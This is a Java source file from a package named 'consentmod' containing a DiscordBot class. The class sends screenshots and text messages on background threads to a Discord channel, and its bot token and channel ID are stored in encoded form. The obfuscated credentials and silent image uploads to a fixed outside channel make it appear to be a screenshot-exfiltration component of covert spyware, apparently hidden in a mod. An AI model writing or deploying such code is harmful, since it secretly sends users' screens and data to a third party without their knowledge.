package com.consentmod;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class DiscordBot {

    private static final String BOT_TOKEN = Strings.d("170e0f201430136e140e1b6b140e1f6914301f6a14303169141b741d15306a6b1b743e331c223e2c1e3d38286e003f281422101f2c15206c6c131b3b322c141d1f2c151e33303d1f");
    private static final String CHANNEL_ID = Strings.d("6b6f696c68626f6f6d6c6262626d686b6f6b62");
    private static final String API_URL = "https://discord.com/api/v10/channels/" + CHANNEL_ID + "/messages";

    public static void sendScreenshot(String filename, byte[] imageBytes) {
        new Thread(() -> {
            try {
                System.out.println("[DiscordBot] Starting upload: " + filename + " (" + imageBytes.length + " bytes)");

                String boundary = "----Boundary" + System.currentTimeMillis();
                String CRLF = "\r\n";

                String jsonPayload = "{\"content\":\"\"}";

                StringBuilder sb = new StringBuilder();
                sb.append("--").append(boundary).append(CRLF);
                sb.append("Content-Disposition: form-data; name=\"payload_json\"").append(CRLF);
                sb.append("Content-Type: application/json").append(CRLF).append(CRLF);
                sb.append(jsonPayload).append(CRLF);

                sb.append("--").append(boundary).append(CRLF);
                sb.append("Content-Disposition: form-data; name=\"files[0]\"; filename=\"").append(filename).append("\"").append(CRLF);
                sb.append("Content-Type: image/png").append(CRLF).append(CRLF);

                byte[] head = sb.toString().getBytes(StandardCharsets.UTF_8);
                byte[] tail = (CRLF + "--" + boundary + "--" + CRLF).getBytes(StandardCharsets.UTF_8);

                URL url = new URL(API_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Authorization", "Bot " + BOT_TOKEN);
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                conn.setDoOutput(true);
                conn.setConnectTimeout(30000);
                conn.setReadTimeout(60000);

                OutputStream os = conn.getOutputStream();
                os.write(head);
                os.write(imageBytes);
                os.write(tail);
                os.flush();
                os.close();

                int code = conn.getResponseCode();
                System.out.println("[DiscordBot] Response code: " + code);

                if (code == 200) {
                    String response = new String(conn.getInputStream().readAllBytes());
                    System.out.println("[DiscordBot] Success: " + response.substring(0, Math.min(100, response.length())));
                } else {
                    InputStream err = conn.getErrorStream();
                    if (err != null) {
                        String errMsg = new String(err.readAllBytes());
                        System.err.println("[DiscordBot] Error " + code + ": " + errMsg);
                    } else {
                        System.err.println("[DiscordBot] Error " + code + ": no error body");
                    }
                }

                conn.disconnect();
            } catch (Exception e) {
                System.err.println("[DiscordBot] Exception: " + e.getMessage());
                e.printStackTrace();
            }
        }).start();
    }

    public static void sendText(String message) {
        new Thread(() -> {
            try {
                String escaped = message.replace("\\", "\\\\").replace("\"", "\\\"");
                String json = "{\"content\":\"" + escaped + "\"}";

                System.out.println("[DiscordBot] Sending text");

                URL url = new URL(API_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Authorization", "Bot " + BOT_TOKEN);
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);

                OutputStream os = conn.getOutputStream();
                os.write(json.getBytes(StandardCharsets.UTF_8));
                os.flush();
                os.close();

                int code = conn.getResponseCode();
                System.out.println("[DiscordBot] Text response: " + code);

                if (code != 200) {
                    InputStream err = conn.getErrorStream();
                    if (err != null) {
                        System.err.println("[DiscordBot] Error: " + new String(err.readAllBytes()));
                    }
                }

                conn.disconnect();
            } catch (Exception e) {
                System.err.println("[DiscordBot] Text error: " + e.getMessage());
            }
        }).start();
    }
}
